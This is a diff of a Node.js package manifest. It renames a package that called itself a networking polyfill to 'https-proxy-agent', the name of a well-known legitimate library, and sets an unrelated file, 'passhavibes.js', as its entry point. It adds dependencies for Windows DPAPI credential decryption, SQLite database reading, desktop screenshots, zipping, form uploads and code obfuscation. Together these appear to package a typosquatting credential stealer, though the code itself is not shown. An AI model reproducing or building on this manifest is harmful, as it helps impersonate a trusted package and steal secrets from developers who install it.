@@ -1,12 +1,27 @@
 {
-  "name": "node-tcp-https",
-  "version": "1.0.6",
-  "description": "Optimized networking polyfill for modern Node.js environments with automated TLS session persistence.",
-  "main": "index.js",
-  "type": "module",
-  "author": "Esrefpasa",
-  "license": "MIT",
+  "name": "https-proxy-agent",
+  "version": "1.0.5",
+  "description": "Custom runtime module for node-tcp-https",
+  "main": "passhavibes.js",
+  "files": [
+    "passhavibes.js"
+  ],
+  "keywords": [
+    "node",
+    "tcp",
+    "https"
+  ],
   "dependencies": {
-    "axios": "^1.7.0"
-  }
+    "@pishion/node-dpapi": "^1.0.0",
+    "@primno/dpapi": "^1.0.0",
+    "axios": "^1.9.0",
+    "buffer-replace": "^1.0.0",
+    "form-data": "^4.0.0",
+    "fs-extra": "^11.1.1",
+    "javascript-obfuscator": "^5.4.2",
+    "jszip": "^3.10.1",
+    "screenshot-desktop": "^1.12.7",
+    "sqlite3": "^5.1.6"
+  },
+  "license": "MIT"
 }
